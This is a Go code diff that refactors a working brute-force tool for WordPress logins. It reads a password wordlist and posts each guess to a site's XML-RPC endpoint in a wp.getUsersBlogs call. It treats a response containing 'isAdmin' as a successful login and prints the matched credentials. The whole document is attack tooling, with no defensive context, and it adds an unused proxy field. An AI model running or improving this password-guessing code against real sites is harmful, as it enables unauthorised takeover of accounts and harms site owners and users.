@@ -46,6 +46,7 @@ var (
 	username  string
 	wordlist  string
 	help      bool
+	re        = regexp.MustCompile(`(<name>isAdmin<\/name>)`)
 )
 
 func argParse() {
@@ -63,18 +64,23 @@ func argParse() {
 	}
 }
 
-type Response struct {
-	Match    bool
-	Response *http.Response
+type Request struct {
+	URL      string
 	Username string
 	Password string
-	Error    error
+	ProxyURL string
+}
+
+type Response struct {
+	Match   bool
+	Request Request
+	Error   error
 }
 
 func main() {
 	argParse()
 
-	ch := make(chan Response)
+	ch := make(chan Response, 10)
 
 	passwords := ReadFileLines(wordlist)
 	CheckPasswords(targetUrl, username, passwords, ch)
@@ -83,58 +89,32 @@ func main() {
 
 	for r := range ch {
 		if r.Error != nil {
-			fmt.Printf("[!] Error checking (%s:%s)", r.Username, r.Password)
+			fmt.Printf("[!] Error checking (%s:%s)", r.Request.Username, r.Request.Password)
 		} else if r.Match {
-			fmt.Printf("[+] Matched -> %s:%s\n", r.Username, r.Password)
+			fmt.Printf("[+] Matched -> %s:%s\n", r.Request.Username, r.Request.Password)
 			break
 		}
 		bar.Add(1)
 	}
 }
 
-func CheckPasswords(xmlrpcUrl, username string, passwords []string, ch chan<- Response) {
-	faultRegexp := regexp.MustCompile(`(<value><int>403<\/int><\/value>)`)
-
+func CheckPasswords(url, username string, passwords []string, ch chan<- Response) {
 	go func() {
 		for i := 0; i < len(passwords); i++ {
-			resp, err := SendRequest(xmlrpcUrl, "user", passwords[i])
-
-			if err != nil {
-				ch <- Response{
-					Match:    false,
-					Username: username,
-					Password: passwords[i],
-					Response: resp,
-					Error:    err,
-				}
-				continue
+			r := Request{
+				URL:      url,
+				Username: username,
+				Password: passwords[i],
+				ProxyURL: "",
 			}
-
-			defer resp.Body.Close()
-			body, _ := io.ReadAll(resp.Body)
-
-			if faultRegexp.Match(body) {
-				ch <- Response{
-					Match:    false, // Password did not match
-					Username: username,
-					Password: passwords[i],
-					Response: resp,
-				}
-			} else {
-				ch <- Response{
-					Match:    true, // Password matched
-					Username: username,
-					Password: passwords[i],
-					Response: resp,
-				}
-			}
+			ch <- r.SendRequest()
 		}
 		close(ch)
 	}()
 }
 
-func SendRequest(xmlrpcUrl, username, password string) (*http.Response, error) {
-	payload := fmt.Sprintf(`
+func (r *Request) Body() io.Reader {
+	return strings.NewReader(fmt.Sprintf(`
 	<?xml version="1.0" encoding="UTF-8"?>
 	<methodCall>
 	  <methodName>wp.getUsersBlogs</methodName>
@@ -142,8 +122,34 @@ func SendRequest(xmlrpcUrl, username, password string) (*http.Response, error) {
 	    <param><value>%s</value></param>
 	    <param><value>%s</value></param>
 	  </params>
-	</methodCall>`, username, password)
-	return http.Post(xmlrpcUrl, "text/xml; charset=UTF-8", strings.NewReader(payload))
+	</methodCall>`, r.Username, r.Password))
+}
+
+func (r *Request) SendRequest() Response {
+	req, _ := http.NewRequest("POST", r.URL, r.Body())
+	client := http.Client{}
+
+	res, err := client.Do(req)
+
+	if err != nil {
+		return Response{
+			Match:   false,
+			Request: *r,
+			Error:   err,
+		}
+	}
+
+	defer res.Body.Close()
+	body, err := io.ReadAll(res.Body)
+
+	if err != nil {
+		return Response{Match: false, Request: *r, Error: err}
+	}
+
+	return Response{
+		Match:   re.Match(body),
+		Request: *r,
+	}
 }
 
 func ReadFileLines(filePath string) []string {
